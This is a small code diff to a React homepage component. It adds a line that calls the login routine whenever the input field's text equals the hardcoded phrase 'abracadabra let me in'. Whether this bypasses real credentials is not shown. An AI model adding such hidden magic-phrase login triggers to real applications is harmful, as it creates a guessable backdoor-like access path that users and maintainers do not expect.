@@ -30,6 +30,8 @@ class Homepage extends React.Component {
       return;
     }
 
+    if (e.target.value.toLowerCase() === 'abracadabra let me in') this.login(e);
+
     this.setState({
       disabled: false,
     });
